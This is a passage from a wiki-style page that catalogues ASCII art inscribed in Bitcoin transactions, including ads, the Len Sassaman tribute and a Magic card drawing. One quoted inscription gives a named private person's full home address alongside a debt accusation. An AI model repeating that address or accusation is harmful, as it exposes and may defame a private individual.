- [tx 5c4f060e6166a530d891cafd0e9df42441d29b1ed9cff71a1652201b8d50bd72](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0706.txt#L7125) ([2021-10-27](https://www.blockchain.com/explorer/transactions/btc/5c4f060e6166a530d891cafd0e9df42441d29b1ed9cff71a1652201b8d50bd72)) TODO what does it represent? It seems so familiar... Decoded from our dumps with `fold -w80 -s`. It is encoded as a sequence of 43 [OP\_RETURN](cryptocurrency.md#op-return) [output scripts](cryptocurrency.md#bitcoin-output-script) each containing 80 payload bytes each<a id="_170"></a>

  ```
             :d,                        ,do'                        ;d;
             :NNk;.                    .OWWk.                    .:OWK,
             '0MMWO:.            ...  .xWMMWd.  ..             .l0WMMk.
              dMMMMW0l.    .,coxO0Kd..oWMMMMNl .xK0kdl:,.    .oKWMMMWl
              ;KMMMMMWKo. .lXMMMMMX; :XMMMMMMX; :NMMMMWKc. 'dXMMMMMM0'
               oWMMMMMMMXd'.'dXMMMNc ,0MMMMMMO. lWMMWKl..,xNMMMMMMMNc
               .dNMMMMMMMMNx,..oXMMK; :XMMMMK; :XMWKc..;kNMMMMMMMMNl.
                 ;kNMMMMMMMMNk, 'kWM0' lNMMX: ,KMNd..:OWMMMMMMMMNx,
             .  '..,xNMMMMMMMMNd..oNMk..dNXo .OMXc .xNMMMMMMMMXd'.'' .'.
           ,ko..kXo'.,xXMMMMMMMWx..dWWd..;,..xWNl .OWMMMMMMMKo..,xNx..kO;
         .xNWo ,KMMXd,.'dXMMMMMMWl '0MNl    oNMO..dWMMMMMWKl..;kNMMO..xMNx'
        cKMMN: :NMMMMNx,..xNMMMMMO. dMMX;  :XMWl ,KMMMMMXo..:kNMMMMK, lWMMXc.
      .dNMMMNc '0MMMMMMNklOWMMMMMN: :NMM0dxKMMK, lWMMMMMNxoOWMMMMMWk. oWMMMWx.
     .kWMMMMMK:..oXMMMMMMMMMMMWNNNd .OMMMMMMMMk..kWNNWMMMMMMMMMMMKl..lXMMMMMWk.
     .;lx0XWMMNk,.'xNMMMMMWKd:,'.,'  dMMMMMMMWl  ',.',:dKWMMMMMNd..;OWMWNKkdl;.
   .coc,...,cokKKd..:KMMMNd. 'ldxd:. ,KMMMMMM0' .:dxdl' .dNMMW0; .okkoc;'..';coc.
   lNMMWXOxl:'..';,  ,0MWo   .',;::;. ;KMMMMK;  ,::;,'.   dWWk.  ....':ldOKNWMMN:
  '0MMMMMMMMMNKkdc;.  ;KX; ,xxdool;.   lWMMNl   .:loddkx, ;X0'
  .:lxOKNMMMMMMMMMMO.lWMMMMMMMMMMMMMMWXo. o0, .;loxkkx:.  .OMMO.  .:dxkkxo:. ;0c
  .kMMMMMMMMMMMMMMMMN:dXXXXXXXXXXXXXXXXXo  .c' ,c;'....',,. dMMd .;:,'....,:' ':.
  .dXXXXXXXXXXXXXXXXXl...................      dMMWNXXXNWK, lNNl ;XMWNXXXNWMd
   ...................xkkkkkkkkkkkkkkkOl..c;  .xMMMMMMMMMN: cXXc :NMMMMMMMMMx.
  ;; .okkkkkkkkkkkkkkkkdWMMMMMMMMMMMMMMMNc ,K0' .kMMMMMMMMMN: :KK: :NMMMMMMMMMk.
  ,0O. oWMMMMMMMMMMMMMMMXWMMMMMMMMMMMMMNKo..xWWk. lNMMMMMMMMX; .... ;XMMMMMMMMNc
  'OMWo .dKNWMMMMMMMMMMMMXNMMMMMMMNKOdl:'.  cNMMWk. lNMMMMMMMNOddddddONMMMMMMMXc
  .OWMMK;  .';cdk0XWMMMMMM00MNKOdl:'...;cl. '0MMMMWk. cXMMMMMMMWXKXNXKNMMMMMMMX:
  'OWMMMMk. ,ol;'...,cox0XWx,;'...;cok0NWWd..xWMMMMMM0, ;0MMMMXd,...'..'cOWMMW0,
  ,0MMMMMMWd..kWMNKOxl:,...,..;dk0NWMMMMMWk..oWMMMMMMMMK:
  .xNMMWOl,.....:xXMMNx..cXMMMMMMMMNc '0MMMMMMMWXOx: .xWMMMMMMMMMO.
  lNMMMMX0XWMMNl  cKMMMMWX00KNWMMM0: .xNMMNOxKMMMMX: ,0MMMMMMMMMWl  '0MMMMMMMWO'
  cXMMMMX:.oWMMMx.  .dNMMMMMMMMMMXd.  lWMMMX; cNMMMMK: ,0MMMMMMMMk.   :XMMMMMWk.
  lXMMMMMx..kMMMMd .c,.'dKWMMMMW0o'... cWMMMWd..kMMMMMK: 'OWMMMMM0'
  cXMMMNo..oNMMMMMK, cNMMMNc ;XXx;..,:cc:,..;xKc ;XMMMMX: ;XMMMMMXl..xNMMMK,
   :XWO; 'kWMMMMMNl '0MMMM0' oWMMWKxlc::coxKWMMx..kMMMMMO. oWMMMMMNx..:KW0,
    ,:..cKMMMMMMWd..xWMMMWo .OMMMMMMMMMMMMMMMMMK, cNMMMMWd..xWMMMMMW0:..:.
      .kWMMMMMMWx..dWMMMMK, lWMMMMMMMMMMMMMMMMMWd .OMMMMMNo..xWMMMMMMNd.
       :0WMMMMWd..oNMMMMWl '0MMMMMMMMMMMMMMMMMMMX; :XMMMMMNo..xWMMMMWk,
        .lKWMXl..xWMMMMMk. ,0WMMMMMMMMMMMMMMMMMNO,  oWMMMMMNd..lXMWO:.
          .ld, ,OWMMMMMK; ...:kNMMMMMMMMMMMMMXx,..' .kMMMMMMWO, ,o:.
              '0MMMMMMNc 'O0l..,dXMMMMMMMMMXd'.,dXXc '0MMMMMMWO.
               .ckXWMWd..kWMMXd,.'dXMMMMMNx'.,xNMMMK; ;KMMWKx:.
                  .:dl..dWMMMMMNx,.'xNWW0: .dNMMMMMMK; ;xo;.
                       .cxOKNWMMMNd..:oc. :KMMMMWNKkd,
                           .;lxOKXNk.    :XNX0kdc,.
  ```
<a id="_171"></a>
- <a id="_172"></a>
  [tx 71d9187cbb7b00b4c516df218499bbc301996262cfafc4533fd7916af1fb6315](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0709.txt#L1808) block 709632, ([2021-11-14](https://www.blockchain.com/explorer/transactions/btc/71d9187cbb7b00b4c516df218499bbc301996262cfafc4533fd7916af1fb6315)) starts a consecutive sequence of transactions that encodes the characters 'Z' and 'N', an ad for the [Zenon Network](https://zenon.network/) blockchain. This is the very first taproot enabled block, foreshadowing the great inscription boom that taproot would lead to, notably in the form of [ordinal ruleset inscriptions](#ordinal-ruleset-inscription).<a id="code-zn-inscription"></a>

  ```
      ,zzzzzzzzzzzzzzzzzzzzzzzz,      
                  .:1zzzzzzzzz.       
                .:qqzzzzqqq,          
             ,;1zzzzzqqq,             
          ,;1zzzzzqqq,                
       ,;qzzzzz1qq,                   
      ,zzzzzzzzzzzzzzzzzzzzzzzz,      

      ,zzzzzq;.           1zzzz,      
      ,zzzzzzzzq,         1zzzz,      
      ,zzzzzzzzzz1:       1zzzz,      
      ,zzzzq:1zzzzzq;.    1zzzz,      
      ,zzzzq  ,qzzzzzz1,  1zzzz,      
      ,zzzzq    .;qzzzzzq:1zzzz,      
      ,zzzzq       ,qzzzzzzzzzz,      
      ,zzzzq         .;qzzzzzzz,  
  ```
  This ASCII art had been previously [noted by sroose and decoded by brando2131 on Reddit](https://www.reddit.com/r/Bitcoin/comments/qtk492/someone_tried_to_put_some_ascii_art_into_the/), and was brought to our attention by [Bagfoot OP446 on twitter](https://x.com/lilbagwing/status/1842622268314091994). [Ciro Santilli](ciro-santilli.md) had previously spotted the art, but failed to decode it. "ZENON NETWORK" is inscribed just after the art confiming the meaning of the characters, but it does not appear in our ASCII dumps presumably because the string it is too short and surrounded by non-ASCII.

  <a id="_173"></a>
  Each line is encoded with [OP\_RETURN](cryptocurrency.md#op-return), is 38 bytes long, and starts and ends in 6 spaces, leading to 26 non-whitespace characters per line. The lines appear in scambled order and it is unclear if there is any logic in the ordering or if it was just meant as a little puzzle. But given the nearby "ZENON NETWORK" inscription, this decoding is overwhelmingly likely correct.

  <a id="_174"></a>
  The following lines also show up in our ASCII dump:<a id="_175"></a>

  ```
    ;4Fdzw1k=zzzzzzzzzzzzzzzz;      
    ,vtv3f5aKY0jGQglP9a1AGw==.      
    ;BynQtpeUyWTXKGTrGhdV2Q==;      
    ;tVMd3L1CKM4wFmyxEEEUV2bY;      
  ```
  They seem like [Base64](computer.md#base64) encoded data due to the `=` sign padding, but nothing human readable comes out of them, so their meaning remains currently unknown.
<a id="_176"></a>
- [tx cbf7cfb6c074e35e82ea604e2de6c82d00c168d7d7a1205383f93a6f40ee8520](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0720.txt#L682) ([2022-01-24](https://www.blockchain.com/explorer/transactions/btc/cbf7cfb6c074e35e82ea604e2de6c82d00c168d7d7a1205383f93a6f40ee8520)) [ASCII typeface](art.md#ascii-typeface) ad for Keepcase, some kind of Bitcoin hardware wallet. Manually converted to horizontal form to not take up too much space here.<a id="_177"></a>

  ```
  @@@@@@@@@@@@@@@@@@@V/@@@@@@@@@@@@@@@@@@@
  @@>                 @                   @.                  @,                  @'                  @;                  @^                  @''                 @:                  @>
           #          @   ###    ###*     @   ###########     @   ##########*     @   /###########    @   ###########*    @    /#########     @   ##########/     @   ###########/    \@@@@@@@@@@@@@@@@@@@
        #######       @   ###    ##       @   ###             @   ###.            @   ###    #####    @   ###/*           @   ###     *##     @   ####,           @   ####"           @///
    #####     #####   @   ########(       @   #########       @   ########        @   ##########.     @   ##<             @   ####### ###     @   *#########      @   #######         KEEPCASE : THE
  ###(   ####   ####  @   ###     ###.    @   ###\            @   ####            @   #####/          @   ###\.           @   ####### ##/     @        ####       @   ###_            ORIGINAL HARDWARE
  ###  ###  ###  ##   @   ###     ###\    @   ##########      @   #########/      @   ###/            @   \#########*     @   ###     #*      @  #########        @   ###########(    WALLET CASE
  ###  ##    ##
  ###  ###  ###   ##
  ###    ####   ####
    #####     ####*
        ######,
  @@>>
  ```

  A bit later we see another ad for the same company:<a id="image-keepcase-jpg"></a>
  ![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/6ea24c417d60a1c5312ca8ec0ab44bbdba2d79d84ceffa4c9455e02f89831d7f.jpg)

  **[Figure 14](#image-keepcase-jpg). keepcase.jpg**. [tx 6ea24c417d60a1c5312ca8ec0ab44bbdba2d79d84ceffa4c9455e02f89831d7f](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0720.txt#L757) ([2022-01-24](https://www.blockchain.com/explorer/transactions/btc/6ea24c417d60a1c5312ca8ec0ab44bbdba2d79d84ceffa4c9455e02f89831d7f)) contains a [data URL](computer.md#data-uri-scheme) for a [JPEG](computer.md#jpeg) image:<a id="_178"></a>

  ```
  /@@@@@@@@@@@@@@@@@@@data:image/jpeg;base64,<base64 image> \@@@@@@@@@@@@@@@@@@@
  ```

  ---
<a id="_179"></a>
- [tx 3c9216146bf1d9415ded8a1d03dd63fae8f0af2cbcaf68efaff4ad654a45b74d](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0739.txt#L3953) ([2022-06-08](https://www.blockchain.com/explorer/transactions/btc/3c9216146bf1d9415ded8a1d03dd63fae8f0af2cbcaf68efaff4ad654a45b74d)) tiny face. The `--BEGIN TRIBUTE--` format is a call back to [BitLen](#len-sassaman-tribute), but they just don't do ASCII art like the old days anymore:<a id="_180"></a>

  ```
  ---BEGIN  TRIBUTE---
  ....!&&&&&&#####B!.:
  ...:GB5Y55555PG#&Y..
  ...^B7^::::^^~7P#J..
  ...:Y7??!^~7?J?JP!..
  ...:7!!?7~7???7?J!..
  ....^!^:~~7!^~77^:..
  :....!7!7???7?J!..:.
  ::...:7Y?77?YYJ!:..:
  :::::.~?JJY5Y77?Y5^.
  ----END   TRIBUTE---
  B5
  ```
<a id="_181"></a>
- [tx 14e89fc01c367841f2d5c2786a3b051d67008be980694272530546a0452aeea9](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0743.txt#L4839) ([2022-07-05](https://www.blockchain.com/explorer/transactions/btc/14e89fc01c367841f2d5c2786a3b051d67008be980694272530546a0452aeea9)). [ASCII typeface](art.md#ascii-typeface) for:<a id="_182"></a>
  > Chockchai Chawatcharaporn

  This seems to be aa Thai name, e.g. possibly [https://www.linkedin.com/in/chokchai-thawatcharaporn-179398213/?originalSubdomain=th](https://www.linkedin.com/in/chokchai-thawatcharaporn-179398213/?originalSubdomain=th). And so we learn that Thai people are the coolest because their name can end in "-porn" which is awesome. The given name is:<a id="_183"></a>

  ```
  @   ###########*    @   ###    ###'     @    ########       @   ###    ###*     @   #########*      @   ###     ###"    @    /#########     @    ########/      @
  @   ###/*           @   ###    ###      @   ###    ###,     @   ###    ##       @   ##/*            @   ###     ###     @   ###     *##     @       ###.        @
  @   ##<             @   ##########      @   ###    ###]     @   ########(       @   ##(             @   ###########     @   ####### ###     @       ###,        @
  @   ###\.           @   ###    ###.     @   ###\   ###      @   ###     ##.     @   ##\             @   ###     ###.    @   ###     ##/     @       ###         @
  @   \#########*     @   ###    ###/     @    #######/       @   ###     ###\    @   ##########\     @   ###     ###/    @   ###     #*      @   /##########     @
  ```

  and the rest is just more of the same, just 10x longer. Manually converted to horizontal form to not take up too much space here.

<a id="_184"></a>
Tip for ASCII art hunters:

<a id="_185"></a>
```
grep -n -r '   ' . | sort
grep -n -r '@@@' . | sort
grep -n -r 'XXX' . | sort
grep -n -r '...' . | sort
```

##### [Len Sassaman](software.md#len-sassaman) tribute

↑ **Parent:** [ASCII art](#ascii-art)  
🏷️ **Tags:** [Len Sassaman](software.md#len-sassaman)

<a id="_189"></a>
Tribute to [computer security researcher](software.md#computer-security-researcher) [Len Sassaman](software.md#len-sassaman), who killed himself on 2011-07-03, starting with an [ASCII art](#ascii-art) portrait followed by text.

<a id="_190"></a>
Because it comes so early in the blockchain, and because it is the first ASCII art on the blochain as far as we can see, and because is so well done, this is by far the most visible ASCII art of the Bitcoin blockchain.

<a id="_191"></a>
Present at [tx 930a2114cdaa86e1fac46d15c74e81c09eee1d4150ff9d48e76cb0697d8e1d72](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0138.txt#L2). It does not show well on [Bitcoin Inscription Indexer](cryptocurrency.md#bitcoin-inscription-indexer) however with rationale described at: [https://github.com/cirosantilli/bitcoin-inscription-indexer/tree/3f53e152ec9bb0d070dbcb8f9249d92f89effa70#smart-newline-joining](https://github.com/cirosantilli/bitcoin-inscription-indexer/tree/3f53e152ec9bb0d070dbcb8f9249d92f89effa70#smart-newline-joining)

<a id="_192"></a>
But it can be seen at on [bitcoinStrings.com](cryptocurrency.md#bitcoinstrings-com) at: [https://bitcoinstrings.com/blk00003.txt](https://bitcoinstrings.com/blk00003.txt).

<a id="_193"></a>
Transaction: [https://www.blockchain.com/btc/tx/930a2114cdaa86e1fac46d15c74e81c09eee1d4150ff9d48e76cb0697d8e1d72](https://www.blockchain.com/btc/tx/930a2114cdaa86e1fac46d15c74e81c09eee1d4150ff9d48e76cb0697d8e1d72) from 2011-07-30, a few weeks after the suicide.

<a id="_194"></a>
Discussion: [https://bitcoin.stackexchange.com/questions/3370/in-which-block-was-len-sassaman-memorialised/101276#101276](https://bitcoin.stackexchange.com/questions/3370/in-which-block-was-len-sassaman-memorialised/101276#101276)

<a id="_195"></a>
Created by famous [computer security researcher](software.md#computer-security-researcher) [Dan Kaminsky](software.md#dan-kaminsky) and Travis Goodspeed, presumably [this other security researcher](https://twitter.com/travisgoodspeed), evidence:<a id="_196"></a>

<a id="_197"></a>
- signature on the tribute
<a id="_198"></a>
- the art is highlighted at [Video 3. "Black OPS of TCP/IP by Dan Kaminsky (2011)"](#video-black-ops-of-tcp-ip-by-dan-kaminsky-2011), which happened very few days after the art was uploaded to the blockchain, thus making it exceedingly unlikely that someone else could have done it

<a id="_199"></a>
"Bernanke" is a reference to [Ben Bernanke](economy.md#ben-bernanke), who was one of the [economists](economy.md#economist) in power in the [US Government](united-states.md#united-states-government) during the [financial crisis of 2007-2008](economy.md#financial-crisis-of-2007-2008), and much criticized by some, as shown for example in the documentary [Inside Job (2010)](economy.md#inside-job-2010). As hinted in the [Genesis block message](cryptocurrency.md#genesis-block-message), the [United States Government](united-states.md#united-states-government) bailed out many big banks that were going to go bankrupt with taxpayer money, even though it was precisly those banks that had started the crisis through their reckless investment, thus violating principles of the free market and business accountability. This was one of the motivations for the creation Bitcoin, which could reduce government power over economic policy.

<a id="_200"></a>
It is worth mentioning that there do exist some slightly earlier "artistic" [inscriptions](social-technology.md#inscription-blockchain) in the form [Punycode inscription](social-technology.md#punycode-inscription) in the [Namecoin](cryptocurrency.md#namecoin) blockchain, but as far as we've seen, the are all trivial compared to `BitLen` in terms of artistic value/size.

<a id="code-len-sassaman-tribute"></a>
```
---BEGIN TRIBUTE---
#./BitLen
:::::::::::::::::::
:::::::.::.::.:.:::
:.: :.' ' ' ' ' : :
:.:'' ,,xiW,"4x, ''
:  ,dWWWXXXXi,4WX,
' dWWWXXX7"     `X,
 lWWWXX7   __   _ X
:WWWXX7 ,xXX7' "^^X
lWWWX7, _.+,, _.+.,
:WWW7,. `^"-" ,^-'
 WW",X:        X,
 "7^^Xl.    _(_x7'
 l ( :X:       __ _
 `. " XX  ,xxWWWWX7
  )X- "" 4X" .___.
,W X     :Xi  _,,_
WW X      4XiyXWWXd
"" ,,      4XWWWWXX
, R7X,       "^447^
R, "4RXk,      _, ,
TWk  "4RXXi,   X',x
lTWk,  "4RRR7' 4 XH
:lWWWk,  ^"     `4
::TTXWWi,_  Xll :..
=-=-=-=-=-=-=-=-=-=
LEN "rabbi" SASSAMA
     1980-2011
Len was our friend.
A brilliant mind,
a kind soul, and
a devious schemer;
husband to Meredith
brother to Calvin,
son to Jim and
Dana Hartshorn,
coauthor and
cofounder and
Shmoo and so much
more.  We dedicate
this silly hack to
Len, who would have
found it absolutely
hilarious.
--Dan Kaminsky,
Travis Goodspeed
P.S.  My apologies,
BitCoin people.  He
also would have
LOL'd at BitCoin's
new dependency upon
   ASCII BERNANKE
:'::.:::::.:::.::.:
: :.: ' ' ' ' : :':
:.:     _.__    '.:
:   _,^"   "^x,   :
'  x7'        `4,
 XX7            4XX
 XX              XX
 Xl ,xxx,   ,xxx,XX
( ' _,+o, | ,o+,"
 4   "-^' X "^-'" 7
 l,     ( ))     ,X
 :Xx,_ ,xXXXxx,_,XX
  4XXiX'-___-`XXXX'
   4XXi,_   _iXX7'
  , `4XXXXXXXXX^ _,
  Xx,  ""^^^XX7,xX
W,"4WWx,_ _,XxWWX7'
Xwi, "4WW7""4WW7',W
TXXWw, ^7 Xk 47 ,WH
:TXXXWw,_ "), ,wWT:
::TTXXWWW lXl WWT:
----END TRIBUTE----
```

<a id="image-len-sassaman-2010"></a>
<img src="https://web.archive.org/web/20220125175427if_/https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Len_Sassaman_27C3.jpg/511px-Len_Sassaman_27C3.jpg" alt="" height="500">

**[Figure 15](#image-len-sassaman-2010). Len Sassaman (2010)** [Source](https://en.wikipedia.org/wiki/File:Len\_Sassaman\_27C3.jpg). Reference image from [Wikipedia](website.md#wikipedia) for the [ASCII art](#ascii-art).

<a id="image-official-portrait-of-ben-bernanke-2008"></a>
<img src="https://web.archive.org/web/20220116025001im_/https://upload.wikimedia.org/wikipedia/commons/thumb/3/3f/Ben_Bernanke_official_portrait.jpg/480px-Ben_Bernanke_official_portrait.jpg" alt="" height="500">

**[Figure 16](#image-official-portrait-of-ben-bernanke-2008). Official portrait of Ben Bernanke (2008)** [Source](https://en.wikipedia.org/wiki/File:Ben\_Bernanke\_official\_portrait.jpg). Reference image from [Wikipedia](website.md#wikipedia) for the [ASCII art](#ascii-art).

<a id="video-black-ops-of-tcp-ip-by-dan-kaminsky-2011"></a>
**[Video 3](#video-black-ops-of-tcp-ip-by-dan-kaminsky-2011). Black OPS of TCP/IP by Dan Kaminsky (2011)** [Source](https://www.youtube.com/watch?v=hLIYq3ePaX4). Presented at the [BlackHat](software.md#black-hat-briefings) 2011 conference. Dan unveils the Len memorial at the given timestamp around 8:41. The presentation was done on [2011-08-03 or 04](https://www.blackhat.com/html/bh-us-11/bh-us-11-briefings.html#Kaminsky), so very few days after the upload to the blockchain.

<a id="_201"></a>
From the JSON transaction we understand the encoding format:<a id="_202"></a>

```
   "out":[
      {
         "spent":false,
         "tx_index":0,
         "type":0,
         "addr":"1CqKQ2EqUscMkeYRFMmgepNGtfKynXzKW7",
         "value":1000000,
         "n":0,
         "script":"76a91481ccb4ee682bc1da3bda70176b7ccc616a6ba9da88ac"
      },
      {
         "spent":false,
         "tx_index":0,
         "type":0,
         "addr":"157sXa7duStAvq3dPLWe7J449sgh47eHzw",
         "value":1000000,
         "n":1,
         "script":"76a9142d2d2d424547494e20545249425554452d2d2d2088ac"
      },
...
      {
         "spent":false,
         "tx_index":0,
         "type":0,
         "addr":"157sXYpjvAyEJ6TdVFaVzmoETAQnHB6FGU",
         "value":1000000,
         "n":77,
         "script":"76a9142d2d2d2d454e4420545249425554452d2d2d2d2088ac"
      }
```
So it is really encoded one line at a time in the `script` of the transaction outputs.

##### [Marijuana](biology.md#marijuana) plant

↑ **Parent:** [ASCII art](#ascii-art)

<a id="_204"></a>
Starting at [tx 6650107a4e4e4838ba1081ce87862c38dcb4181b8d34fc0405b099213ba76033](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0328.txt#L1051) ([2014-11-04](https://www.blockchain.com/explorer/transactions/btc/6650107a4e4e4838ba1081ce87862c38dcb4181b8d34fc0405b099213ba76033)) and going on one line per transaction using the [bitcoin blockchain `j(` upload system](cryptocurrency.md#bitcoin-blockchain-j-upload-system), there is a [marijuana](biology.md#marijuana) plant [ASCII art](art.md#ascii-art):

<a id="_205"></a>
```
j(-> 1EGa1izEFDHzEobDDQny73re9BwXdzhZvH <-
j(                 ,
j(                dM
j(                MMr
j(               4MMML                  .
j(               MMMMM.                xf
j(              "M6MMM               .MM-
j( h..          +MM5MMM            .MMMM
j( .MM.         .MMMMML.          MMMMMh
j( )MMMh.        MM5MMM         MMMMMMM
j(  3MMMMx.     'MMM3MMf      xnMMMMMM"
j(  '*MMMMM      MMMMMM.     nMMMMMMP"
j(    *MMMMMx    "MMM5M\    .MMMMMMM=
j(     *MMMMMh   "MMMMM"   JMMMMMMP
j(       MMMMMM   GMMMM.  dMMMMMM
j(        MMMMMM  "MMMM  .MMMMM(        .n
j(         *MMMMx  MMM"  dMMMM"    .nnMMMM
j(Mn...     'MMMMr 'MM   MMM"   .nMMMMMMM*
j(4MMMMnn..   *MMM  MM  MMP"  .dMMMMMMM""
j( ^MMMMMMMMx.  *ML "M .M*  .MMMMMM**"
j(    *PMMMMMMhn. *x > M  .MMMM**""
j(       ""**MMMMhx/.h/ .=*"
j(                .3P"%....
j(              nP"     "*MMnx
```

<a id="_206"></a>
The transaction before the ASCII art [tx 9b08c00ced2bca4525d74e82db9af2aec8ef213eb1c1bf68a48b6be929968332](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0328.txt#L1048) starts with what is likely a "Legalize" and must be a [Tor Onion service](cryptography.md#onion-service):<a id="_207"></a>

```
j(-> 1EGa1izEFDHzEobDDQny73re9BwXdzhZvH <-
```
but that address as is + `.onion` is invalid, TODO find the correct one.

<a id="_208"></a>
Other marijuana plants can be found contained entirely in single transactions:<a id="_209"></a>

<a id="_210"></a>
- [tx b338cdddb20a7ffe5114a2eec7bef736720ab5eeeb4a723e66ef623f42949ccb](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0358.txt#L541) via [cryptograffiti.info](#cryptograffiti-info)
<a id="_211"></a>
- [tx fc4981261701d06610394c4200a9cbf03f890ac928db58938bed8d7ba7eaccf3](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0359.txt#L433) via [cryptograffiti.info](#cryptograffiti-info) Signed:<a id="_212"></a>

  ```
  [ mirrored by http://dmabraham.info/ | moarrr ]
  ```
<a id="_213"></a>
- [tx 55623bf694f6dfbda4db2ea7a940ffd80c49eee3430e44a57fdfecd4e9381f72](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0359.txt#L412) via [cryptograffiti.info](#cryptograffiti-info). Signed:<a id="_214"></a>

  ```
  [ mirrored by http://dmabraham.info/ | moarrr ]
  [ CryptoGraffiti: Donate BTC: 1MVpQJA7FtcDrwKC6zATkZvZcxqma4JixS ]
  [ Latest News: EU/Greece chaos due to huge debts! ]
  ```

  who appears on some other cryptograffiti messages as well.

<a id="_215"></a>
tx d338da06d13a21a296506c0c8cd8c8533ba8fa076ff5c2c1fd02a457aac3ef77 via [cryptograffiti.info](#cryptograffiti-info) contains a marihuana plant followed by a complaint:<a id="_216"></a>

```
[ mirrored by http://dmabraham.info/ | moarrr ]
[ CryptoGraffiti: Donate BTC: 1MVpQJA7FtcDrwKC6zATkZvZcxqma4JixS ]
[ Latest News: EU/Greece chaos due to huge debts! ]
[ Bless! ]

{ Supa - https://bitcoin-otc.com/viewratingdetail.php?nick=supa }
William Robert Girdlestone
1535 Dingwall RD Apt 35
Courtenay
British Columbia
Canada
V9N 3S8

( https://bitcointalk.org/index.php?topic=575743.0 )
[ One of the lowest rated #bitcoin-otc users, owing me at least 10 BTC ]
[ Most likely much more with compounding interesting, but its all ]
[ written off as a huge loss to me. Never again deal with him! ]
```

##### Force of Will

↑ **Parent:** [ASCII art](#ascii-art)  
🏷️ **Tags:** [Magic: The Gathering](magic-the-gathering.md)

<a id="_219"></a>
[tx 9a74d0ee2e9a925d9afadc413e087fa2effda031935bf19a0d4d48df76e4ce3f](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0332.txt#L457) ([2014-12-03](https://www.blockchain.com/explorer/transactions/btc/9a74d0ee2e9a925d9afadc413e087fa2effda031935bf19a0d4d48df76e4ce3f))

<a id="_220"></a>
[ASCII art](art.md#ascii-art) of a [Force of Will](https://gatherer.wizards.com/Pages/Card/Details.aspx?multiverseid=413591), a famous and powerful [Magic: The Gathering](magic-the-gathering.md) card first printed in 1996.

<a id="_221"></a>
This is [Ciro Santilli](ciro-santilli.md)'s personal favorite ASCII art he has found in the blockchain so far. Also Ciro could not find any other previous source of this, so there is some chance it is original. One can dream.

<a id="_222"></a>
The choice of card is probably linked to the function of the card in the game of [Magic: The Gathering](magic-the-gathering.md). This card essentially prevents the opponent from casting a spell they are about to cast. The presumed intended meaning of this art is further accentuated by the [old card type term "interrupt" (late renamed to "instant")](https://magic.wizards.com/en/articles/archive/rules-interrupted-2002-07-03), which suggests that "this ASCII art is an interruption to the normal monetary transactions of the blockchain".

<a id="_223"></a>
One of also reminded of the [prayer wars](#prayer-wars) interruption attempts. We could not however identify anything specific that this ASCII art might have tried to interrupt besides the normal flow of monetary transactions.

<a id="_224"></a>
If one goes full art critic mode, it is also tempting to draw a parallel between the card's "You may pay 1 life" alternative casting cost (as opposed to 5 mana, 3 and two blue, which is a very large cost for most games) as being a reference to the money spent by the uploader of the art to upload it.

<a id="_225"></a>
TODO understand exactly how it was encoded and why it is so weird. The `UUUU` has a slightly weird encoding which we fixed by hand here TODO understand.

<a id="_226"></a>
```
 -------------------------------------
|  Force of Will               3 U U  |
|  ---------------------------------  |
| |                  ////////////   | |
| |                ////() ()\////\  | |
| |               ///_\ (--) \///\  | |
| |        )      ////  \_____///\\ | |
| |       ) \      /   /   /    /   | |
| |    ) /   \     |   |  /   _/    | |
| |   ) \  (  (   /   / /   / \     | |
| |  / ) ( )  / (    )/(    )  \    | |
| |  \(_)/(_)/  /UUUU \  \\\/   |   | |
| .---------------------------------. |
| Interrupt                           |
| ,---------------------------------, |
| | You may pay 1 life and remove a | |
| | blue card in your hand from the | |
| | game instead of paying Force of | |
| | Will's casting cost.  Effects   | |
| | that prevent or redirect damage | |
| | cannot be used to counter this  | |
| | loss of life.                   | |
| | Counter target spell.           | |
| `---------------------------------` |
|                                     l
| Illus.  Terese Nelsen               |
 -------------------------------------
```

<a id="image-force-of-will-magic-the-gathering-card-alliances"></a>
<img src="https://web.archive.org/web/20211127070559if_/https://cdn1.mtggoldfish.com/images/h/Force-of-Will-ALL-672.jpg" alt="" height="600">

**[Figure 17](#image-force-of-will-magic-the-gathering-card-alliances). Force of Will Magic: The Gathering card (Alliances)** [Source](https://www.mtggoldfish.com/price/Alliances/Force+of+Will\#paper). A high resolution scan of the original card depicted in the ASCII art for comparison.

<a id="_227"></a>
The following two ASCII transactions:<a id="_228"></a>

```
tx 0f05c47a8caafadecc10d70ba3bf010eaf6bb416b5e1ad7b01cf3445f5fb7a1c
I am. Therefore, I have come to be.

-- Hyena


tx e6d48f6912929a58a2ee30c13768058777d8547215c27109b5cb0724e7abaaba
Erich,
Bro, this looks excellent!!
-Duriel
```
suggest this ASCII art might have been uploaded by [Figure 47. "Erich Erstu"](#image-erich-erstu), AKA Hyena, creator of [cryptograffiti.info](#cryptograffiti-info), a service which would have allowed uploading ASCII content to the blockchain.

<a id="_229"></a>
The only other mention of "Duriel" in the blockchain is [tx 140562ceb42fc8943fa52ccc0ddbb11ca2d88dae9b5240d7a4b46864538c515a](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0364.txt#L572) which has some freedom of speech comments and gives the email:<a id="_230"></a>

```
Duriel@paystamper.com = 1HcuhfTAiQCt6KdMG2rZLXsTcKYj9nLDhS
```
paystamper.com was some other blockchain service from circa 2015:<a id="_231"></a>

<a id="_232"></a>
- [https://bitcointalk.org/index.php?action=profile;threads;u=412250;sa=showPosts](https://bitcointalk.org/index.php?action=profile;threads;u=412250;sa=showPosts)
<a id="_233"></a>
